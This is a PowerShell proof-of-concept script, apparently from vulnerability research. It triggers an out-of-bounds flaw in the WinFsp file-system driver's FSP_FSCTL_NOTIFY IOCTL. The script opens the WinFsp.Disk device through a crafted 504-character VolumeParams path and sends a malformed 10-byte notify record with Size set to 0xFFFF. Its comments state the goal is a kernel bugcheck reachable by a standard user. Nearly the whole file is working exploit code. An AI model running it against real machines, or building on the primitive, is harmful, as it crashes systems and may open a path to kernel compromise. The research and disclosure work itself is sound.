# trigger-correct.ps1 — CORRECTED trigger for the WinFsp FSP_FSCTL_NOTIFY OOB finding.
# Identical primitive to poc.exe (single FSP_FSCTL_NOTIFY_INFO record, Size=0xFFFF, 10-byte
# input, METHOD_NEITHER) but uses the REAL device path the poc got wrong:
#   \\?\GLOBALROOT\Device\WinFsp.Disk\VolumeParams=<504x 0xF000>
# EXPECTED: kernel bugcheck in the async FspVolumeNotifyWork walk (Verifier/Special Pool).
# This WILL crash the box. Run only under a snapshot, as the standard user, AFTER Verifier armed.
param([string]$Log = "C:\WinFspTest\trigger-out.log")

function W($m){ "$((Get-Date).ToString('o'))  $m" | Out-File -FilePath $Log -Append -Encoding utf8 }
"" | Out-File -FilePath $Log -Encoding utf8
W "WHOAMI=$(whoami)"

$src = @"
using System;using System.Runtime.InteropServices;
public static class T{
[DllImport("kernel32.dll",CharSet=CharSet.Unicode,SetLastError=true)]
public static extern IntPtr CreateFileW(string p,uint a,uint s,IntPtr sa,uint d,uint f,IntPtr t);
[DllImport("kernel32.dll",SetLastError=true)]
public static extern bool DeviceIoControl(IntPtr h,uint code,IntPtr inb,uint ins,IntPtr outb,uint outs,out uint ret,IntPtr ov);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@
Add-Type -TypeDefinition $src | Out-Null

$vp = [string]::new([char]0xF000,504)
$path = "\\?\GLOBALROOT\Device\WinFsp.Disk\VolumeParams=$vp"
$GR=[uint32]2147483648; $inv=[IntPtr](-1)
$h = [T]::CreateFileW($path,$GR,0,[IntPtr]::Zero,3,0,[IntPtr]::Zero)
$e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
if($h -eq $inv){ W "OPEN_FAIL err=$e path=$path"; exit 1 }
W ("OPEN_OK handle=0x{0:X}" -f $h.ToInt64())

# FSP_FSCTL_NOTIFY = CTL_CODE(FILE_DEVICE_FILE_SYSTEM=0x9, 0x800+'n'=0x86E, METHOD_NEITHER=3, ANY=0)
$code = ([uint32]0x9 -shl 16) -bor ([uint32]0 -shl 14) -bor ([uint32]0x86E -shl 2) -bor 3
W ("FSP_FSCTL_NOTIFY=0x{0:X8}" -f $code)

# 10-byte record: Size=0xFFFF (UINT16), Filter=1 (UINT32), Action=1 (UINT32), pack(1)
$rec = [byte[]]@(0xFF,0xFF, 0x01,0x00,0x00,0x00, 0x01,0x00,0x00,0x00)
$inb = [Runtime.InteropServices.Marshal]::AllocHGlobal($rec.Length)
[Runtime.InteropServices.Marshal]::Copy($rec,0,$inb,$rec.Length)
$ret=[uint32]0
W "ABOUT_TO_SEND_IOCTL input=$($rec.Length) bytes record.Size=0xFFFF"
Start-Sleep -Milliseconds 200   # let the log flush before the likely bugcheck
$ok = [T]::DeviceIoControl($h,[uint32]$code,$inb,[uint32]$rec.Length,[IntPtr]::Zero,0,[ref]$ret,[IntPtr]::Zero)
$e2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
W "DeviceIoControl returned ok=$ok lasterr=$e2 (if you see this, no immediate crash yet; async worker may still fire)"
[T]::CloseHandle($h) | Out-Null
[Runtime.InteropServices.Marshal]::FreeHGlobal($inb)
W "DONE (handle closed). Waiting a few seconds for async worker..."
Start-Sleep -Seconds 5
W "STILL_ALIVE after 5s"
